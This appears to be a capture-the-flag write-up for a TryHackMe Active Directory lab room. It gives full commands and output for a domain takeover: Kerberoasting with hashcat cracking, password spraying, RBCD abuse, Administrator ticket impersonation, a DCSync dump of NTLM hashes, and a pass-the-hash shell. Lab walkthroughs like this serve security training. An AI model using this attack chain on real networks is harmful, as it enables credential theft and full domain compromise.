---
tags:
  - THM
  - Windows
  - Hard
  - AD
  - Kerberoasting
  - Brute-Force
  - RBCD
  - PtT
  - DCSync
  - PtH
---
https://tryhackme.com/room/operationendgame
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.67.143.7 thm.local ad.thm.local
```

# Enumeration

Port scan reveals that the target is a **Domain Controller (DC)**:
```console
$ nmap -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,7680,9389,47001,49664,49665,49666,49667,49669,49670,49671,49675,49676,49681,49705,49714,49720 -sV -sC thm.local

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-04-26 16:22:42Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-04-26T16:24:51+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=ad.thm.local
| Not valid before: 2026-04-25T16:18:42
|_Not valid after:  2026-10-25T16:18:42
|_ssl-date: 2026-04-26T16:24:51+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: AD
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: ad.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-26T16:23:38+00:00
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf            .NET Message Framing
47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc             Microsoft Windows RPC
49665/tcp open  msrpc             Microsoft Windows RPC
49666/tcp open  msrpc             Microsoft Windows RPC
49667/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49676/tcp open  msrpc             Microsoft Windows RPC
49681/tcp open  msrpc             Microsoft Windows RPC
49705/tcp open  msrpc             Microsoft Windows RPC
49714/tcp open  msrpc             Microsoft Windows RPC
49720/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-26T16:23:40
|_  start_date: N/A
```

User **guest** can authenticate **without password** via **SMB**:
```console
$ nxc smb thm.local -u 'guest' -p '' --shares

SMB         10.67.143.7   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.67.143.7   445    AD               [+] thm.local\guest: 
SMB         10.67.143.7   445    AD               [*] Enumerated shares
SMB         10.67.143.7   445    AD               Share           Permissions     Remark
SMB         10.67.143.7   445    AD               -----           -----------     ------
SMB         10.67.143.7   445    AD               ADMIN$                          Remote Admin
SMB         10.67.143.7   445    AD               C$                              Default share
SMB         10.67.143.7   445    AD               IPC$            READ            Remote IPC
SMB         10.67.143.7   445    AD               NETLOGON                        Logon server share 
SMB         10.67.143.7   445    AD               SYSVOL                          Logon server share 
```

User **guest** can also authenticate via **LDAP**:
```console
$ nxc ldap thm.local -u 'guest' -p ''

LDAP        10.67.143.7   389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.67.143.7   389    AD               [+] thm.local\guest: 
```

Found valid users via **LDAP**:
```console
$ nxc ldap thm.local -u 'guest' -p '' --users-export users_by_guest.txt

LDAP        10.67.143.7   389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.67.143.7   389    AD               [+] thm.local\guest: 
LDAP        10.67.143.7   389    AD               [*] Enumerated 331 domain users: thm.local
LDAP        10.67.143.7   389    AD               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.67.143.7   389    AD               Guest                         2024-05-10 11:48:41 0        Tier 1 User
LDAP        10.67.143.7   389    AD               DWAYNE_NGUYEN                 2024-05-10 11:09:45 1        Tier 1 User
LDAP        10.67.143.7   389    AD               BRANDON_PITTMAN               2024-05-10 11:09:45 1        Tier 1 User
LDAP        10.67.143.7   389    AD               BRET_DONALDSON                2024-05-10 11:09:45 1
...
LDAP        10.67.143.7   389    AD               [*] Writing 331 local users to users_by_guest.txt
```

# AS-REP Attempt

Get users with **pre-authentication disabled**:
```console
$ GetNPUsers.py -outputfile TGTs.txt -usersfile users_by_guest.txt -no-pass 'thm.local/guest'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DWAYNE_NGUYEN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BRANDON_PITTMAN doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:92ab45f6e90cdc9b52e652fffeece774$27e9286b5085b0bb7e3cc72403c06b45a7f4872c227ccba3b11e4866b68eb6d43fb3ba8d74a0fbfbdb2f05113d5c648fca616fe5717b431b1301eb6328bc37f38cdf8ba518b1ebef695a2fa76c2c7874ffd00b1ba1a98011bf51a47646f3c107b7e6befff9e5be848f8b6b08910ce48f1d59510bc5d3defc46f0e5deec044bbfb2e17155cae94dd5374d1a85871a430b9c2a15c1aaf7c55240f1f774e22a9b82b35410890881e4b78a5679b31f6f1e0d6a85cf2b94a68cbb6c7cf962fcb309a9a59ae0523d72909d2e79b8aed50b57d18a24eb07b6385ffd559135ee1f8ae341b4afcaf79fd5
...
```

Could not crack any valid password, **failed AS-REP attack**:
```console
$ hashcat -a 0 -m 18200 TGTs.txt /usr/share/wordlists/rockyou.txt
...
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: TGTs.txt
...
```

# Kerberoasting

Successfully executed **kerberoasting without pre-authentication** for **guest** user:
```console
$ nxc ldap thm.local -u users_by_guest.txt -p '' --kerberoasting TGSs.txt

LDAP        10.67.143.7     389    AD               [*] Windows 10 / Server 2019 Build 17763 (name:AD) (domain:thm.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.67.143.7     389    AD               [+] thm.local\Guest: 
LDAP        10.67.143.7     389    AD               [*] Total of records returned 1
LDAP        10.67.143.7     389    AD               [*] sAMAccountName: CODY_ROY, memberOf: CN=Remote Desktop Users,CN=Builtin,DC=thm,DC=local, pwdLastSet: 2024-05-10 08:06:07.611965, lastLogon: 2024-04-24 09:41:18.970113
LDAP        10.67.143.7     389    AD               $krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$a116d55a039f3ac09cf139f40828a97b$d1ef91998081b2a8f64c016181dbf86c15aaf91e11403e3fa97ada202c93a7b21f2267badb0cb08a2688749601a537aac755f8b1691d20f2818850217f4f51663f73f6878e4d2c56d6453d117b429ec5f9c67c9398073d3bee53e2a91df24e2205d3add12de5af4c418450799dabb3535519f5c4012404c2f0c57d05c16558e85dcedb8757045dfc0c7910202abc25a72ea8415e00da369a42a50836d9c6882908d5cbef38201d804bf8e1661436bf6f7995c7c5184bfdcbcc2aa85acf459462dad54b801880bac932cee87d9fc79449eff6095f0c943a83f78a957d83807daa7ae27f95fcf3774eedb355ecdfcb2641b6f4fb2a38223e2ece63d2d81bd6435369b1467a31407b12603ed7ec058426445b6a12498fd9214196df746b42e9386acb46fd652c1bc441732dbeda7530980ee9f87c8ddf066101583fa9f863b6930ebc3c8ed8cb49f3d4b7f228048d53fc7f7d49bdeb47f7824a98a1ae959bf60bbd8b795d3c0422d28c11052cede00bc7220bdf1f0ffd163175510f7c4d09dc1ec8707d934db7359a0766ed0217af94222134e12a16b274c347995085a6df3ed7b67ab492be6db895ca51afaa8250a62c2a9f7978af8d97517d374ba4bcccb0342ae30f99e88482fc12abce6a3443ea5cd316e1f801863bc9f247b6f2f5206ac167a24729cfad5fa5eaff5820273b818049f977bccf1244604fe1ab1d9372c029e2e373e50b76aa7d7f863f50ffbc84e5b9fd996e2eb72bf3d416e0e73ef28ba2ddcc0186c972d9daf09b54c5f4ae5fc83c55b980e7ef9729763d3d08c89857778d3bf9b0161672c1e66447532aab2acb4f8c91f5c5976141d8517a852defeb68c5584cf0b40ec46b7780120e9662f61366ff01448ebef641a0597ebc95a64eafc16386facaddb460fb19e906433579dc62288f48e000d2e97f846fd5b4e20d1e2a73df1bbc265e5fc69a2b0a17d51a73bc50a9ca2d488c903fde7d52a543cffd055dc707f07c841c8b5dbc6d8d601bcb278307be24e022e17805ee0a0403eb1e94a2ca61808391810f0677dab8fc3f91acaed61d34cb1c6a45b7d3c4ec1cbc6adc1ea0336319473b7bb0ca32b5935da63be2573077f4e25122ac54e29281dc6774868b6e98dc24edf368e13077ac60eab5822d41b34c4299904c632c4d6e4054a6947ad281937b204b9480295693014f4813bb098b160668f95d57664e98462a82ec433372ecdade697e18e94361b6ed16b622205febf260d0e866dc24dbaa1e850ce5e7eb109015801f9439bb0c9254a6fdc57b67ef1a6f328c9d33aaba731bfa05501aec2dcb7526c7de5285fea24f6b945b3dc3c1a611c27588d9ccfa1f6574ca8d29f3786ae7b3de7916cfb94e09a7480fb1beeee934d945079a5c0eac65
```

Cracked password hash for **CODY_ROY**:
```console
$ hashcat -a 0 -m 13100 TGSs.txt /usr/share/wordlists/rockyou.txt
...
$krb5tgs$23$*CODY_ROY$THM.LOCAL$thm.local\CODY_ROY*$a116d55a039f3ac09cf139f40828a97b$d1ef91998081b2a8f64c016181dbf86c15aaf91e11403e3fa97ada202c93a7b21f2267badb0cb08a2688749601a537aac755f8b1691d20f2818850217f4f51663f73f6878e4d2c56d6453d117b429ec5f9c67c9398073d3bee53e2a91df24e2205d3add12de5af4c418450799dabb3535519f5c4012404c2f0c57d05c16558e85dcedb8757045dfc0c7910202abc25a72ea8415e00da369a42a50836d9c6882908d5cbef38201d804bf8e1661436bf6f7995c7c5184bfdcbcc2aa85acf459462dad54b801880bac932cee87d9fc79449eff6095f0c943a83f78a957d83807daa7ae27f95fcf3774eedb355ecdfcb2641b6f4fb2a38223e2ece63d2d81bd6435369b1467a31407b12603ed7ec058426445b6a12498fd9214196df746b42e9386acb46fd652c1bc441732dbeda7530980ee9f87c8ddf066101583fa9f863b6930ebc3c8ed8cb49f3d4b7f228048d53fc7f7d49bdeb47f7824a98a1ae959bf60bbd8b795d3c0422d28c11052cede00bc7220bdf1f0ffd163175510f7c4d09dc1ec8707d934db7359a0766ed0217af94222134e12a16b274c347995085a6df3ed7b67ab492be6db895ca51afaa8250a62c2a9f7978af8d97517d374ba4bcccb0342ae30f99e88482fc12abce6a3443ea5cd316e1f801863bc9f247b6f2f5206ac167a24729cfad5fa5eaff5820273b818049f977bccf1244604fe1ab1d9372c029e2e373e50b76aa7d7f863f50ffbc84e5b9fd996e2eb72bf3d416e0e73ef28ba2ddcc0186c972d9daf09b54c5f4ae5fc83c55b980e7ef9729763d3d08c89857778d3bf9b0161672c1e66447532aab2acb4f8c91f5c5976141d8517a852defeb68c5584cf0b40ec46b7780120e9662f61366ff01448ebef641a0597ebc95a64eafc16386facaddb460fb19e906433579dc62288f48e000d2e97f846fd5b4e20d1e2a73df1bbc265e5fc69a2b0a17d51a73bc50a9ca2d488c903fde7d52a543cffd055dc707f07c841c8b5dbc6d8d601bcb278307be24e022e17805ee0a0403eb1e94a2ca61808391810f0677dab8fc3f91acaed61d34cb1c6a45b7d3c4ec1cbc6adc1ea0336319473b7bb0ca32b5935da63be2573077f4e25122ac54e29281dc6774868b6e98dc24edf368e13077ac60eab5822d41b34c4299904c632c4d6e4054a6947ad281937b204b9480295693014f4813bb098b160668f95d57664e98462a82ec433372ecdade697e18e94361b6ed16b622205febf260d0e866dc24dbaa1e850ce5e7eb109015801f9439bb0c9254a6fdc57b67ef1a6f328c9d33aaba731bfa05501aec2dcb7526c7de5285fea24f6b945b3dc3c1a611c27588d9ccfa1f6574ca8d29f3786ae7b3de7916cfb94e09a7480fb1beeee934d945079a5c0eac65:MKO)mko0
...
```

# CODY_ROY

Enumerated more valid users as **CODY_ROY**:
```console
$ nxc ldap thm.local -u 'CODY_ROY' -p 'MKO)mko0' --users-export users_by_cody_roy.txt
...
```

Found valid credentials for **ZACHARY_HUNT** via **password spraying**:
```console
$ nxc smb thm.local -u users_by_cody_roy.txt -p 'MKO)mko0' --continue-on-success
SMB         10.67.143.7     445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
...
SMB         10.67.143.7     445    AD               [+] thm.local\CODY_ROY:MKO)mko0
...
SMB         10.67.143.7     445    AD               [+] thm.local\ZACHARY_HUNT:MKO)mko0
```

# ZACHARY_HUNT

There is an intended way to root this machine via **ZACHARY_HUNT** user which I will not cover. I will instead show the unintended way.

# RBCD

Ran BloodHound to discover potential privilege escalation paths:
```console
$ bloodhound-ce-python -c All -d thm.local -u 'CODY_ROY@thm.local' -p 'MKO)mko0' -ns 10.67.143.7 --dns-tcp --dns-timeout 8 -dc ad.thm.local --zip
...
INFO: Compressing output into 20260511203803_bloodhound.zip

$ sudo su
Password:

# bloodhound-cli up
...

# bloodhound-cli resetpwd
...
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: TkFQIzVXnxWrrCf7HerFOY7FUXTzguiw
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Logged in and uploaded the BloodHound ZIP file to the web <http://127.0.0.1:8080>. The **guest** user has **GenericWrite** over the DC, allowing Resource-Based Constrained Delegation (RBCD) attack. We abuse it by passing an empty password hash:
```console
$ rbcd.py -delegate-to 'AD$' -delegate-from CODY_ROY -action write -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' thm.local/guest

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] CODY_ROY can now impersonate users on AD$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     CODY_ROY     (S-1-5-21-1966530601-3185510712-10604624-1144)
```

Get a service ticket for **Administrator**:
```console
$ getST.py -spn 'cifs/ad.thm.local' -impersonate 'Administrator' 'thm.local/CODY_ROY:MKO)mko0'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_ad.thm.local@THM.LOCAL.ccache
```

# DCSync

Authenticate as **Administrator** using Pass-the-Ticket (PtT):
```console
$ export KRB5CCNAME=Administrator@cifs_ad.thm.local@THM.LOCAL.ccache

$ nxc smb thm.local -u 'Administrator' --use-kcache
SMB         thm.local       445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         thm.local       445    AD               [+] thm.local\Administrator from ccache (Pwn3d!)
```

Perform a DCSync attack:
```console
$ nxc smb thm.local -u 'Administrator' --use-kcache --ntds drsuapi
SMB         thm.local       445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         thm.local       445    AD               [+] thm.local\Administrator from ccache (Pwn3d!)
SMB         thm.local       445    AD               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         thm.local       445    AD               Administrator:500:aad3b435b51404eeaad3b435b51404ee:e599bf2fe56d6a21b3a5487bb4761d1b:::
SMB         thm.local       445    AD               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         thm.local       445    AD               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:09416770385185f2e4b556844f052968:::
...
```

Get an **Administrator shell** using Pass-the-Hash (PtH):
```console
$ smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e599bf2fe56d6a21b3a5487bb4761d1b' Administrator@thm.local
...
```

Get the **flag**:
```console
$ type C:\Users\Administrator\Desktop\flag.txt.txt
```
